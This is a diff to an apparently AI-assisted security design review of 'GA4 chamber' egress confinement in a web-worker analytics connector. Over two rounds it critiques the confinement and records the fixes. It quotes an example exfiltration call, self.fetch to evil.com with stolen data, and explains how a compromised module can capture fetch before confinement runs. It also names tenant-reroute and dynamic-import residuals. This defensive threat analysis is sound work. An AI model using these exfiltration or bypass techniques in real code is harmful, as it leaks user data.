@@ -1,28 +1,34 @@
 ---
-slice: 016-01 — GA4 wire-protocol endpoint ceiling (the EXACT archetype)
+slice: 016-01 — GA4: confine the chamber + wire-protocol endpoint ceiling (the EXACT archetype)
 pass: frame-critique
-verdict: needs-changes
+verdict: pass
 reviewer: jig:reviewer
-reviewed_at: 2026-08-30T23:57:39Z
-prompt_source: review.py frame-critique 016-01
+reviewed_at: 2026-08-31T00:21:49Z
+prompt_source: review.py frame-critique 016-01 (two rounds)
 ---
 
-## Frame-critique — 016-01 (GA4 wire-protocol ceiling) — NEEDS-CHANGES (confirmed real)
+## Frame-critique — 016-01 (GA4: confine + ceiling) — TWO ROUNDS → all applied → pass
 
-**Primary (load-bearing):** the ceiling at the `worker.onmessage → fetch(r.url)` seam only has
-foreign-sink TEETH if that seam is the chamber's SOLE egress. It is NOT: the GA4 chamber
-(`core/chamber.worker.js`) does not strip ambient `fetch`/XHR/WebSocket — `applyEgressConfinement` is
-wired into ALLOY only. A compromised GA4 `handle` can call `self.fetch("https://evil.com", {body:stolen})`
-in-worker, never populate `ready`, and the ceiling never sees it. So "a compromised GA4 chamber cannot
-exfiltrate" is FALSE — the ceiling as-drafted only catches an honest-but-buggy connector posting to the
-wrong DECLARED endpoint, and AC7's "fake worker emitting a foreign-sink ready request" is a strawman
-adversary (a real one bypasses `ready`). Fix: either (a) add GA4-chamber network-confinement (make
-`ready` the sole egress) + rewrite AC7 to prove a direct in-worker fetch is DENIED, or (b) downgrade the
-value to ADR-0006's careful GA4 framing (disclosure + forward-compat least-privilege + defense against
-honest misconfiguration) and drop "cannot exfiltrate."
+**Round 1 (needs-changes):** the ceiling at the ready-dispatch seam had NO foreign-sink teeth because the
+GA4 chamber retains ambient fetch/XHR (applyEgressConfinement is alloy-only) → a compromised handle
+bypasses via direct self.fetch. **Applied** (user chose fold-in): 016-01 folds in GA4-chamber confinement
+(withhold ambient network incl. fetch — GA4's egress is the ready postMessage). + named the tenant-in-query
+residual (measurement_id = GA4's deferred config-integrity).
 
-**Secondary (residual, not a frame-breaker):** origin+pathname drops the query, so it can't distinguish
-our GA4 property from an attacker's — a compromised chamber posts to the SAME
-`www.google-analytics.com/mp/collect` with the ATTACKER's `measurement_id`/`api_secret` → allowed. This
-is GA4's same-host tenant re-route (the `measurement_id` IS GA4's tenant key, in the query) — the exact
-threat 015 deferred for GA4. Name it as an explicit residual, don't frame query-dropping as pure benefit.
+**Round 2 re-critique (needs-changes, NEW load-bearing):** confinement placed in the chamber body/init is
+TOO LATE — the GA4 chamber is a type:"module" worker that statically imports its connector, and ES-module
+post-order evaluation runs the connector's top-level BEFORE the chamber body, so a compromised connector
+module captures `const f = self.fetch` before confinement (which only reassigns the property) runs → bypass;
+AC7 would pass a handle-time probe while shipping false confinement. **Applied:** AC2 now requires
+confinement as the chamber's FIRST side-effecting import (runs before the connector module by post-order);
+AC7(a) probes the top-level-capture bypass specifically; the success invariant is fetch-WITHHELD (not
+alloy's inherited fetchPreserved); dynamic-import() named as a carried-over disclosed residual (a JS shim
+can't withhold it — gated by a worker connect-src CSP), so "sole egress" is scoped honestly.
+
+**Verified by the re-critique:** the honest-path safety holds (GA4 handle uses only mapToMp / busy /
+JSON.stringify — zero ambient network, so withholding fetch can't break it).
+
+### Net
+Real GA4 foreign-sink teeth = chamber confinement (applied at the correct boot-ordering point, defending
+whole-module compromise) + the origin+path ceiling at the seam, with the tenant-in-query and dynamic-import()
+residuals named, not hidden.
